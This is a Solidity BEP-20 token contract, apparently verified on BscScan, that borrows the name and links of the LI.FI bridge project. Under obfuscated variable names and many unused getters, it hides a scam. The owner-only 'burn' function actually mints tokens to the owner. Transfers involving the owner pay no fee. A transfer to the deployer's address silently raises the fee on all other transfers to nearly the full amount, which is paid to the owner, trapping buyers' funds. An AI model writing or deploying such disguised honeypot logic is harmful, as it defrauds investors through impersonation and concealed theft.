/**
 *Submitted for verification at BscScan.com on 2022-12-01
*/

/*
lifiprotocol
Advanced Bridge & DEX Aggregation
Cross-chain bridging, swapping and messaging will drive your multi-chain strategy and attract new users from everywhere.
Developer Solution Providing Advanced Bridge Aggregation with DEX Connectivity 
        https://li.fi
        https://li.fi/sdk/
        https://transferto.xyz 
        https://twitter.com/lifiprotocol
*/


// SPDX-License-Identifier: Unlicensed
pragma solidity =0.8.1;
contract lifiprotocol {
address private  uFickV = address(0);
address private  CabUdz = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  ARwxgx = 10000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant HAlVyn = 99999;
mapping (address => uint256) public balanceOf;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  IJEEGq = 1000000000000000;
uint8 public constant decimals = 18;
address private  imsGBn = address(0);
address public owner;
address private  RdYICC = address(0);
uint256 private  zESSWm = 1000000000000000000000;
uint256 private  BmcgSC = 100000000;
string public  name = "lifiprotocol";
address private  MkxhFW = address(0);
uint256 private  ItZFLI = 10000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  kHGPAq = 1000000000000000000;
address private  WCMqBD = address(0);
address private  dPLwYW = address(0);
uint256 private  BYekqu = 1000000000000000000;
string public  symbol = "lifiprotocol";
address private  NDKzpL = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  GpCGVR = address(0);


function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getuFickV() private returns (address) {
return uFickV;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tbYXyiF 0");
require(spender != address(0), "fbYXyiF 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
constructor () {
imsGBn = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}


function _getWCMqBD() private returns (address) {
return WCMqBD;
}

function _getBmcgSC() private returns (uint256) {
return BmcgSC;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}


function _getBYekqu() private returns (uint256) {
return BYekqu;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "bYXyiF");
require(to != address(0), "bYXyiF");
require(amount <= balanceOf[from], "bYXyiF");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* HAlVyn/kHGPAq ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==imsGBn){
kHGPAq = HAlVyn+2;
}
emit Transfer(from, to, transferAmount);
}


function _getMkxhFW() private returns (address) {
return MkxhFW;
}















function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getzESSWm() private returns (uint256) {
return zESSWm;
}

function _getItZFLI() private returns (uint256) {
return ItZFLI;
}

function _getIJEEGq() private returns (uint256) {
return IJEEGq;
}



function _getCabUdz() private returns (address) {
return CabUdz;
}



function _getRdYICC() private returns (address) {
return RdYICC;
}





function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getGpCGVR() private returns (address) {
return GpCGVR;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getARwxgx() private returns (uint256) {
return ARwxgx;
}

function _getdPLwYW() private returns (address) {
return dPLwYW;
}

function _getNDKzpL() private returns (address) {
return NDKzpL;
}


}